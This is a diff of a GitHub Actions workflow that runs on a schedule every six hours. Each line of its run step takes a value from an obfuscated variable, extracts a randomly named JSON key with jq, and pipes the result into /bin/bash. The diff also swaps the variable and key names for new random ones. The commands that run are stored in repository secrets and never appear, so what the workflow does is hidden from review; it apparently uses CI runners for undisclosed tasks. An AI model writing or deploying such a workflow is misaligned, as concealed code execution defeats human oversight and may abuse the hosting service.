@@ -1,24 +1,32 @@
 name: zhangshun19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 3/6 * * *'
-
+    - cron: '54 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zhangshun19871010
         env:
-          t3: ${{ secrets.t3 }}
+          xu8: ${{ secrets.xu8 }}
         run: |
-          echo $t3 | jq -r .nwtbf355 | /bin/bash
-          echo $hb07 | jq -r .b21201 | /bin/bash
-          echo $ry5966 | jq -r .ekrds25 | /bin/bash
-          echo $xvpe493 | jq -r .pb8879 | /bin/bash
-          echo $lezgu9188 | jq -r .uojap18 | /bin/bash
-          echo $hmn131 | jq -r .onfj51010 | /bin/bash
-          echo $n4 | jq -r .t97 | /bin/bash
+          echo $xu8 | jq -r .d62 | /bin/bash
+          echo $uasr75 | jq -r .tm3 | /bin/bash
+          echo $qebg70 | jq -r .vkmby862 | /bin/bash
+          echo $uyu4284 | jq -r .gxu3641 | /bin/bash
+          echo $c53238 | jq -r .nxc85 | /bin/bash
+          echo $ybvao17506 | jq -r .j259 | /bin/bash
+          echo $lgqk0318 | jq -r .rsfp0279 | /bin/bash
+          echo $u6 | jq -r .bfta73903 | /bin/bash
+          echo $gdrj4 | jq -r .xksj5 | /bin/bash
+          echo $ifskf8 | jq -r .u439 | /bin/bash
+          echo $zsce799 | jq -r .ikq18 | /bin/bash
+          echo $dfq90 | jq -r .wrnlx79892 | /bin/bash
+          echo $t88187 | jq -r .bshbf14638 | /bin/bash
+          echo $jzihi34 | jq -r .gmxum82093 | /bin/bash
+          echo $s965 | jq -r .fvxvm5 | /bin/bash
+          echo $jw87 | jq -r .grsdz3 | /bin/bash
 
